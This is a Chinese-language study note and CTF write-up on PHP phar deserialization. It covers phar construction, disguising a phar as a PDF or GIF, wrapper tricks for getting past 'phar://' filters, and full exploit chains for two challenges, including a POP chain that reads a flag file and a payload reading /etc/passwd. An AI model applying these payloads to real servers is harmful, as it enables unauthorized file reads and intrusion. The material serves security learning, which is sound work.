## phar反序列化漏洞

```php
<?php
    class Demo{}
    $phar=new Phar("asdf.phar");//后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");//设置存根stub
    $test=new Demo();
    $test->name='asdfgh';
    $phar->setMetadata($test);//将自定义的meta-data序列化后存入manifest
    $phar->addFromString("test.txt","asdfghjkl");//phar本质上是对文件的压缩所以要添加要压缩的文件
    $phar->stopBuffering();
?>
```

>生成phar文件要先将ini中的`phar.readonly`设置为Off

![](https://img.misaka.gq/_posts/PHP-Study/PHP_phar.png)

1. 文件标识,必须以`__HALT_COMPILER();?>`结尾,前面的内容没有限制,因此可以对文件头进行伪造

2. `meta-data`被序列化存储,通过`phar://`协议解析时会将其进行反序列化

受影响的函数

```
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| fileatime          | filectime      | file_exists   | file_get_contents  | touch             | get_meta_tags          |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| file_put_contents  | file           | filegroup     | fopen              | hash_file         | get_headers            |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| fileinode          | filemtime      | fileowner     | fileperms          | md5_file          | getimagesize           |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| is_dir             | is_executable  | is_file       | is_link            | sha1_file         | getimagesizefromstring |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| is_readable        | is_writable    | is_writeable  | parse_ini_file     | hash_update_file  | imageloadfont          |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| copy               | unlink         | stat          | readfile           | hash_hmac_file    | exif_imagetype         |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
```

```php
<?php
    class Demo{
        function __destruct(){
            echo $this->name."\n";
        }
    }
    $filename="phar://asdf.phar/test.txt";
    file_exists($filename);#执行反序列化,输出asdfgh
?>
```

---

对文件头进行伪造,可以将phar文件伪装成pdf或gif等文件

```php
<?php
    class Demo{}
    @unlink("asdf.phar");
    $phar=new Phar("asdf.phar");//后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("%PDF-1.6<?php __HALT_COMPILER(); ?>");//设置pdf的文件头
    $test=new Demo();
    $test->name='asdfgh';
    $phar->setMetadata($test);
    $phar->addFromString("test.txt","asdfghjkl");
    $phar->stopBuffering();
?>
```

```
 ~/桌面 file asdf.phar
asdf.phar: PDF document, version 1.6
```

在生成phar文件后,可以对其文件后缀进行修改,不影响使用

当发生禁止phar开头时,可以用以下协议代替

```
compress.zlib://phar://phar.phar/test.txt
compress.bzip2://phar://phar.phar/test.txt 
php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt
```

```php
<?php
    class Demo{
        function __destruct(){
            echo "<br>".$this->name."<br>";
        }
    }
    $filename="php://filter/read=convert.base64-encode/resource=phar://asdf.phar/test.txt";
    file_get_contents($filename);#执行反序列化,输出asdfgh
?>
```

---

例题:[https://github.com/CTFTraining/swpuctf_2018_simplephp](https://github.com/CTFTraining/swpuctf_2018_simplephp)

首先注意到URL`file.php?file=`可能存在任意文件读取

`file.php?file=file.php`

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```

`file.php?file=function.php`

```php
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?>
```

`file.php?file=base.php`

```php
<?php 
    session_start(); 
?> 
<!DOCTYPE html> 
<html> 
<head> 
    <meta charset="utf-8"> 
    <title>web3</title> 
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"> 
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script> 
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script> 
</head> 
<body> 
    <nav class="navbar navbar-default" role="navigation"> 
        <div class="container-fluid"> 
        <div class="navbar-header"> 
            <a class="navbar-brand" href="index.php">首页</a> 
        </div> 
            <ul class="nav navbar-nav navbra-toggle"> 
                <li class="active"><a href="file.php?file=">查看文件</a></li> 
                <li><a href="upload_file.php">上传文件</a></li> 
            </ul> 
            <ul class="nav navbar-nav navbar-right"> 
                <li><a href="index.php"><span class="glyphicon glyphicon-user"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li> 
            </ul> 
        </div> 
    </nav> 
</body> 
</html> 
<!--flag is in f1ag.php-->
```

`file.php?file=class.php`

```php
 <?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?> 
```

`file.php?file=index.php`

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?>  
```

`file.php?file=upload_file.php`

```php
<?php 
include 'function.php'; 
upload_file(); 
?> 
<html> 
<head> 
<meta charest="utf-8"> 
<title>文件上传</title> 
</head> 
<body> 
<div align = "center"> 
        <h1>前端写得很low,请各位师傅见谅!</h1> 
</div> 
<style> 
    p{ margin:0 auto} 
</style> 
<div> 
<form action="upload_file.php" method="post" enctype="multipart/form-data"> 
    <label for="file">文件名:</label> 
    <input type="file" name="file" id="file"><br> 
    <input type="submit" name="submit" value="提交"> 
</div> 

</script> 
</body> 
</html>
```

`file.php`中存在`file_exists($file)`可以通过phar进行反序列化

`function.php`中通过`upload_file_check`对文件类型进行了限制

`class.php`中`Test`类下的`file_get`函数中存在`file_get_contents`,可以尝试对flag进行读取

`Test::file_get`由`Test::__get`进行调用,`__get`方法有个特性,当访问类中某个不存在的变量时,会自动对`__get`进行调用,但是没有代码可以直接对`Test`类进行调用,因此需要在某个地方新建一个`Test`类

注意到在`Show`类下的`__toString`函数中有`$this->str['str']->source`,假设`this->str['str']`指向`Test`类,而`Test->source`不存在,因此会对`Test::__get`产生调用,因此可以将`this->str['str']`设置为`Test`

`__toString`方法在试图将类作为字符串输出时进行调用,而在`C1e4r`类中`__destruct`函数中有`echo $this->test;`,假设`$this->test`设置为`Show`,那么就可以对`Show::__toString`进行调用

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test."\n";
    }
}
class Show
{
    public $source;
    public $str;
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $key;
    }
}

$clear = new C1e4r();
$show = new Show();
$test = new Test();
$clear->str=$show;
$show->str['str']=$test;
?>
```

得到结果为`source`,说明`Test::_get`的参数`$key`的值为`source`,因此构造POP链时,`params`的键值为`source`

```php
<?php
class C1e4r
{
    public $test;
    public $str;
}
class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}
$a=new C1e4r();
$b=new Show();
$c=new Test();

$a->str=$b;
$b->str['str']=$c;
$c->params['source']='/var/www/html/f1ag.php';//注意使用绝对路径因为..被过滤了

$phar=new Phar("asdf.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt","asdf");
$phar->stopBuffering();
system("mv asdf.phar asdf.gif");
?>
```

`function.php`中通过`$filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg";`对文件进行重命名,`$_SERVER['REMOTE_ADDR']`为`172.18.0.1`,`$_FILES["file"]["name"]`为`asdf.gif`

得到的md5为`337def6af3af5b39784016d8a5e06f8c`,最终的文件名为`337def6af3af5b39784016d8a5e06f8c.jpg`

payload`file.php?file=phar://upload/337def6af3af5b39784016d8a5e06f8c.jpg`

---

例题 2019年新生赛 image-checker

从`class.php`可以得知存在`curl_exec`,可以使用`file://`协议来进行文件读取

从题目主页面和`imagesize.php`文件名推测其使用了`getimagesize`函数,可以利用phar反序列漏洞

题目要生成的phar文件

```php
<?php
class CurlClass
{
}
class MainClass
{
    public function __construct($path)
    {
        $this->call = "httpGet";
        $this->arg = "file://" . $path;
    }
}
$phar = new Phar("asdf.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置存根stub
$test = new MainClass('/etc/passwd');
$test->name = 'asdfgh';
$phar->setMetadata($test); //将自定义的meta-data序列化后存入manifest
$phar->addFromString("test.jpeg", "asdfghjkl"); //phar本质上是对文件的压缩所以要添加要压缩的文件
$phar->stopBuffering();
```

将phar文件修改为jpeg文件,上传即可

在check image size中传入`compress.zlib://phar://uploads/487dfa0355.jpeg/test.jpeg`即可